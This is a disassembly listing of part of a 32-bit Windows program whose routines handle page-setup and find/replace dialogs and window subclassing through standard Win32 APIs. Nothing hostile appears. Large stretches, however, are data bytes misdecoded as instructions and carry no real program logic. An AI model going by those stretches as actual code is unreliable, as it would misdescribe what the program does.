mov [ esi + 0x14 ] eax
mov eax [ ebp - 0x5c ]
mov [ esi + 0x18 ] eax
mov eax [ ebx + 0x68 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebx + 0x64 ]
mov edx [ ebx + 0x60 ]
mov eax [ ebx + 0x5c ]
call sub_416f14
push esi
lea edi [ esi + 0x1c ]
lea esi [ ebp - 0x70 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ ebx + 0x78 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebx + 0x74 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x6c ]
call sub_416f14
push esi
lea edi [ esi + 0x2c ]
lea esi [ ebp - 0x70 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x44 ] sub_42dc3c
or [ esi + 0x10 ] 0x400
push esi
call PageSetupDlgA
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add [ esi + 0x10 ] 0x20
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x14 ]
mov [ ebx + 0x7c ] eax
mov eax [ esi + 0x18 ]
mov [ ebx + 0x80 ] eax
mov eax [ esi + 0x2c ]
mov [ ebx + 0x6c ] eax
mov eax [ esi + 0x30 ]
mov [ ebx + 0x70 ] eax
mov eax [ esi + 0x34 ]
mov [ ebx + 0x74 ] eax
mov eax [ esi + 0x38 ]
mov [ ebx + 0x78 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call GlobalFree
push eax
call GlobalFree
sub_42e6f8
inc esp
out 0x42 eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 8 ] ch
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 8 ] cl
inc edx
add [ eax + ebp * 8 ] dl
inc edx
add [ eax ] dl
add al [ eax ]
add [ ebx + ebp + 0x44 ] cl
add ah bl
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add ah cl
stosd [ edi ]
inc esp
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ esi + ecx * 4 - 0x2493ffbc ] ah
inc esp
add [ ebx - 0x74b3ffbc ] dl
inc ecx
add [ eax + ecx * 4 ] dl
inc esp
add [ esp + ebx * 2 ] dh
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
or [ ebp - 0x297fffbc ] 0x44
add [ ebx + ebx * 8 - 0x2517ffbc ] bl
inc esp
add [ eax - 0x3ffbba6 ] ch
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add [ eax - 0x18 ] bh
inc edx
add [ edx + ecx * 4 - 0x3177ffbc ] dl
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
sub_42e7ce
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ eax + ebp * 8 + 0x42 ] dl
add ah bl
mov eax [ 0xffffffffa00c0044 ]
inc esp
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
sub_42e878
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44aa68
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0xb021
je r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov edx ebx
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
and eax 0x7f
mov [ ebx + 0xc ] eax
sub_42e8bc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call GetPropA
push eax
call CallWindowProcA
pop ebp
retn
sub_42e8f8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
sub eax 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4681a4
cmp eax [ ebp + 0x8 ]
jne r-xdata
sub eax 0x80
je r-xdata
push ebp
call sub_42e8bc
pop ecx
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4681c8
jmp r-xdata
push ebp
call sub_42e8bc
pop ecx
mov ebx eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call RemovePropA
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4681a4
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4681a4
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4681c8
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
call sub_4681c8
jmp r-xdata
sub_42e9ac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push edi
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
call sub_42dc3c
cmp esi 0x110
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov esi [ edi + 0x1c ]
mov eax esi
call sub_42ec6c
inc eax
jne r-xdata
push 0x15
push 0x0
push 0x0
mov eax esi
call sub_42ecd4
push eax
mov eax esi
call sub_42ec6c
push eax
push 0x0
push ebx
call SetWindowPos
mov eax esi
call sub_42ecd4
inc eax
je r-xdata
push 0xfffffffc
push ebx
call GetWindowLongA
push eax
movzx eax [ rw-data ]
push eax
push ebx
call SetPropA
push sub_42e8f8
push 0xfffffffc
push ebx
call SetWindowLongA
mov eax 0x1
sub_42ea34
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42dca4
mov ax [ r-xdata ]
mov [ ebx + 0x58 ] ax
mov [ ebx + 0x5a ] 0xffffffff
mov [ ebx + 0x5e ] 0xffffffff
lea eax [ ebx + 0x84 ]
mov [ eax ] 0x28
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x30 ]
mov [ eax + 0x4 ] edx
mov edx [ rw-data ]
mov [ eax + 0x8 ] edx
lea edx [ ebx + 0xac ]
mov [ eax + 0x10 ] edx
mov [ eax + 0x18 ] 0x100
lea edx [ ebx + 0x1ac ]
mov [ eax + 0x14 ] edx
mov [ eax + 0x1a ] 0x100
mov [ eax + 0x1c ] ebx
mov [ eax + 0x20 ] sub_42e9ac
mov eax FindTextA
mov [ ebx + 0x64 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_42eade
add [ eax ] al
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x10
push eax
call SendMessageA
lea eax [ esi + 0x68 ]
call sub_40cf90
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42dcec
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x208 ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_42eb34
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_443644
mov ebx eax
or edi 0xffffffff
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
xor edi edi
sub_42eb70
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
test eax eax
je r-xdata
mov [ ebx + 0x90 ] 0x100
mov [ ebx + 0xa4 ] sub_42e9ac
xor ecx ecx
mov dl 0x1
mov eax [ sub_42e6f8 ]
call sub_448d80
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0x208 ] ebx
lea eax [ esi + 0x20c ]
push eax
push sub_42eb34
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ ebx + 0x68 ]
call sub_44d054
mov [ ebx + 0x88 ] eax
xor eax eax
mov esi rw-data
push eax
call BringWindowToTop
mov al 0x1
pop esi
pop ebx
retn
jae r-xdata
and edx 0x7f
bt [ ebx + 0x58 ] edx
inc eax
add esi 0x4
cmp al 0xd
jne r-xdata
mov edx [ esi ]
or [ ebx + 0x90 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov [ rw-data ] ebx
lea eax [ ebx + 0x84 ]
push eax
call [ ebx + 0x64 ]
mov esi eax
mov [ ebx + 0x80 ] esi
test esi esi
setne al
pop esi
pop ebx
retn
or [ ebx + 0x90 ] 0x200
mov eax [ ebx + 0x44 ]
mov [ ebx + 0xa8 ] eax
sub_42ec84
push ebx
add esp 0xfffffff0
mov ebx edx
mov edx [ eax + 0x5a ]
mov [ ebx ] edx
mov edx [ eax + 0x5e ]
mov [ ebx + 0x4 ] edx
mov edx [ eax + 0x80 ]
test edx edx
je r-xdata
add esp 0x10
pop ebx
retn
push esp
push edx
call GetWindowRect
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
sub_42ecec
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_42dd20
test al al
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov edx [ ebx ]
cmp edx [ rw-data ]
jne r-xdata
mov edx [ ebx + 0x8 ]
lea ecx [ edi + 0x84 ]
cmp edx ecx
jne r-xdata
mov ax [ r-xdata ]
mov [ edi + 0x58 ] ax
xor ebx ebx
mov esi rw-data
inc ebx
add esi 0x4
cmp bl 0xd
jne r-xdata
mov eax ebx
cmp al 0xf
ja r-xdata
mov eax [ edi + 0x90 ]
and eax [ esi ]
je r-xdata
mov eax [ edi + 0x90 ]
test al 0x8
je r-xdata
and eax 0x7f
bts [ edi + 0x58 ] eax
test al 0x30
je r-xdata
mov eax edi
mov si 0xffed
call sub_40346c
jmp r-xdata
test al 0x40
je r-xdata
mov eax edi
mov si 0xffec
call sub_40346c
jmp r-xdata
mov al 0x1
push esp
mov eax [ edi + 0x80 ]
push eax
call GetWindowRect
mov eax [ esp ]
mov [ edi + 0x5a ] eax
mov eax [ esp + 0x4 ]
mov [ edi + 0x5e ] eax
xor eax eax
mov [ edi + 0x80 ] eax
push 0x0
push 0x0
push 0xb021
mov eax [ edi + 0x68 ]
call sub_44d054
push eax
call PostMessageA
xor eax eax
mov [ edi + 0x68 ] eax
sub_42ede4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4044a8
mov edx eax
lea eax [ ebx + 0xac ]
mov ecx 0xff
call sub_408744
pop esi
pop ebx
retn
sub_42ee08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4044a8
mov edx eax
lea eax [ ebx + 0x1ac ]
mov ecx 0xff
call sub_408744
pop esi
pop ebx
retn
sub_42ee2c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42ea34
mov eax ReplaceTextA
mov [ esi + 0x64 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_42ef10
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408d28
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_42efab
add [ edi ] cl
add [ eax ] al
add [ eax + edi - 0x5e33ffb9 ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x18004738 ] al
movsb [ edi ] [ esi ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + edi + 0x47 ] bh
add [ ecx + 0x47 ] ch
add [ eax ] al
js r-xdata
add [ eax ] al
cmp [ fs : edi ] al
in al 0xa3
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x38 ] ah
inc edi
add [ ebx ] bh
inc edi
add [ 0x47 ] dh
add [ eax ] al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f0bd
retn
cmp [ rw-data ] 0x0
je r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + edi + 0x47 ] bl
add al al
movsd [ edi ] [ esi ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] ch
cmp [ edi ] al
sbb [ edx + 0x47 ] ah
add [ eax ] al
and al 0x38
inc edi
add [ eax ] bl
movsd [ edi ] [ esi ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] ah
cmp [ edi ] al
pop esp
movsd [ edi ] [ esi ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + edi ] bl
inc edi
add [ eax + 0x47a3 ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42f0b6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add [ eax ] al
pushad
cmp [ edi ] al
cmp al 0xa3
inc edi
add [ eax ] bh
movsb [ edi ] [ esi ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x38 ] dh
inc edi
add al dl
mov [ 0x47 ] eax
add [ eax ] al
insb
cmp [ edi ] al
les esp [ edi + eax * 2 ]
add [ eax + 0x38 ] ch
inc edi
add [ eax ] bl
mov [ 0x47 ] eax
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404a64
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_42f0c0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403dbc
call sub_42ef10
mov eax [ r-xdata ]
call sub_417b84
mov eax [ r-xdata ]
call sub_417c24
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417bd0
sub_42f100
add al 0xf1
inc edx
add [ ebx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
outsb
or al 0x62
jae r-xdata
insb
push ebx
je r-xdata
nop
inc edx
outsd
je r-xdata
outsb
or esp [ gs : edx + 0x73 ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
int1
inc edx
add [ ecx ] cl
bound esi [ ebx + 0x4c ]
outsd
ja r-xdata
add [ eax + 0x61 ] dl
inc esp
add [ eax + 0x6a ] bh
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add al bl
jns r-xdata
add [ eax + ecx * 4 + 0x44 ] cl
add [ esp + edi * 2 + 0x44 ] al
add [ ebx + ecx * 4 + 0x41 ] cl
add [ eax + ecx * 4 ] dl
loop r-xdata
xor al [ eax ]
clc
outsd
insd
dec esp
imul ebp [ esi + 0x65 ] 0x4c73620a
je r-xdata
inc esp
add [ esp + ebx * 2 ] dh
inc esp
add [ eax + 0x4c00445b ] ah
inc esp
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
mov eax [ ecx ]
adc al 0x88
arpl [ ebp + 0x72 ] sp
or [ ebp + 0x78 ] al
je r-xdata
push edx
or esp [ edx + 0x73 ]
jb r-xdata
inc esp
add [ ebx ] bl
add bh bh
js r-xdata
add [ edx + ecx * 4 + 0x6c380044 ] dl
add al bl
jbe r-xdata
add ah bl
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
imul esp [ edi + 0x68 ] 0x6e694c74
or [ gs : edx + 0x73 ] ah
push ebx
jo r-xdata
imul ebp [ esi + 0x65 ] 0x5273620b
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add al bh
je r-xdata
jae r-xdata
or [ fs : edx + 0x73 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x78450864
je r-xdata
je r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
sbb [ ebx ] 0x44
add [ ecx ] ah
add bh bh
mov eax 0x5400445a
pop ebx
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
sub [ esp + eax * 2 ] bl
add [ eax + eax ] dh
[ esp + ecx * 4 ]
insb
nop
nop
inc edx
add [ edi ] al
push es
push esp
inc edx
jbe r-xdata
inc esp
add [ eax + 0x2000446c ] ah
pop ebp
inc esp
add [ esp + ebp * 2 + 0x6400044 ] cl
inc ebx
add [ esi ] al
push esp
inc edx
jbe r-xdata
add [ eax ] bh
insb
add [ eax - 0x57ffbb89 ] ch
pop edx
inc esp
add ah ch
popad
inc esp
add ah bh
cmovb eax [ eax ]
insb
add al 0x43
add ah bl
jbe r-xdata
aam 0xc
inc edx
insb
jae r-xdata
mov ah 0x34
inc eax
add [ ebx + edi * 2 + 0x44 ] ch
je r-xdata
add [ eax ] dl
inc eax
cdq
add [ eax ] al
push [ eax + ebp * 2 + 0x687c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000d ] al
outsd
outsb
jae r-xdata
insb
hlt
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int1
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x42f2 ] dl
insb
jae r-xdata
adc [ eax ] eax
add eax 0x6c797453
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
test [ esi + 0x44 ] ah
add ah dl
xchg [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x90656c62
adc ah dh
outsb
je r-xdata
int1
inc edx
add [ eax + 0x1 ] ch
add bh bh
fadd [ ebx + eax * 2 ]
jb r-xdata
hlt
inc ebp
js r-xdata
add [ ebx + 0x33 ] esi
mov eax r-xdata
call sub_403dbc
call sub_42ef10
mov eax [ r-xdata ]
call sub_417b84
mov eax [ r-xdata ]
call sub_417c24
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417bd0
retn
rol [ eax - 0xf ] 0x42
add [ ebx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
dec ecx
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x43
push 0x6948776f
outsb
je r-xdata
add [ eax + 0x53080010 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ edx - 0x27010000 ] bl
push 0x10044
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
push cs
add [ esi ] cl
push eax
popad
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add ah dl
or al 0x42
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
push ebx
push 0x1657061
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
add [ ecx + esi * 8 ] bh
inc edx
add [ 0x6f427362 ] al
js r-xdata
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ ebp * 8 - 0x2493ffbc ] dh
inc esp
add [ ebx - 0x74b3ffbc ] dl
inc ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
test [ edx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
cmc
inc edx
add [ esi + esi * 8 ] bl
inc edx
add [ edx + eax ] ah
add [ eax ] al
dec eax
xor [ eax + eax - 0x24 ] al
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add ah cl
stosd [ edi ]
inc esp
insb
jae r-xdata
outsd
ja r-xdata
int1
inc edx
add [ ecx + 0x1 ] ch
add bh bh
hlt
or [ edx + 0x73 ] esp
bound esi [ ebx + 0x46 ]
jb r-xdata
add [ eax + ecx * 4 ] dl
inc esp
add [ esp + ebx * 2 ] dh
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
pushfd
or al [ ebx ]
adc dh 0x44
add al dh
adc [ ebx ] al
call 0xffffffffa8433a3b
pop edx
inc esp
add ah bh
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add [ eax - 0x56 ] ch
inc esp
add [ edx + ecx * 4 - 0x3177ffbc ] dl
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
inc esp
add [ ebx + ecx * 4 + 0x41 ] cl
popad
insb
push esp
pop eax
inc ecx
add [ eax ] bh
add [ eax ] al
push [ eax + 0xa ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x42f52472
add [ eax ] al
add [ eax ] al
je r-xdata
inc eax
add [ eax ] al
add bh bh
push eax
or al [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
xchg esp eax
adc [ eax ] al
xor [ eax ] al
add bh bh
pushad
or al [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
call [ eax + 0xa ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 8 + 0x42 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
inc edx
add [ eax - 0xc ] cl
inc edx
add [ eax + eax ] al
add [ esp + ebp * 2 ] dl
inc ecx
add ah bl
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax ] bl
or [ ebx ] eax
xor [ ecx + eax * 2 + 0x420be400 ] cl
add [ ebx + ecx * 4 + 0x41 ] cl
add [ esp + ecx + 0xb880042 ] bh
inc edx
add ah cl
or al 0x42
add ah al
or eax 0xff40042
inc edx
add ah bl
or al 0x42
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
enter 0x4308 0x0
add [ eax ] eax
out dx eax
dec [ eax + 0x600430a ]
push esp
push esp
imul ebp [ ebp + 0x65 ] 0xf4549072
inc edx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x42f41072
add [ eax ] dl
insd
inc ecx
add [ 0x78450800 ] al
je r-xdata
imul ebp [ esi + 0x74 ] sub_42f100
push 0xd8ff0001
add [ eax ] al
imul ebp [ esi + 0x65 ] 0x4273620c
add [ edx + esi * 8 + 0x16c0042 ] al
add [ eax ] al
sub [ edi ] ch
inc esp
push esp
outsd
jo r-xdata
insd
or [ gs : edx + 0x73 ] esp
sub_42f2f9
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000d ] al
outsd
outsb
jae r-xdata
inc edx
add [ eax + 0x1 ] ch
add bh bh
fadd [ ebx + eax * 2 ]
jb r-xdata
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x53080010 ] al
push 0x6948776f
outsb
je r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx - 0x27010000 ] bl
push 0x10044
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
push cs
add [ esi ] cl
push eax
popad
jb r-xdata
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ ebp * 8 - 0x2493ffbc ] dh
inc esp
add [ ebx - 0x74b3ffbc ] dl
inc ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
test [ edx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
cmc
inc edx
add [ esi + esi * 8 ] bl
inc edx
add [ edx + eax ] ah
add [ eax ] al
dec eax
xor [ eax + eax - 0x24 ] al
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add ah cl
stosd [ edi ]
inc esp
insb
jae r-xdata
int1
adc [ eax ] eax
add eax 0x6c797453
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
test [ esi + 0x44 ] ah
add ah dl
xchg [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x90656c62
adc ah dh
outsb
je r-xdata
add [ eax + ecx * 4 ] dl
inc esp
add [ esp + ebx * 2 ] dh
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
pushfd
or al [ ebx ]
adc dh 0x44
add al dh
adc [ ebx ] al
call 0xffffffffa8433a3b
pop edx
inc esp
add ah bh
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add [ eax - 0x56 ] ch
inc esp
add [ edx + ecx * 4 - 0x3177ffbc ] dl
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
inc esp
add [ ebx + ecx * 4 + 0x41 ] cl
popad
insb
push esp
pop eax
inc ecx
add [ eax ] bh
add [ eax ] al
push [ eax + 0xa ]
inc ebx
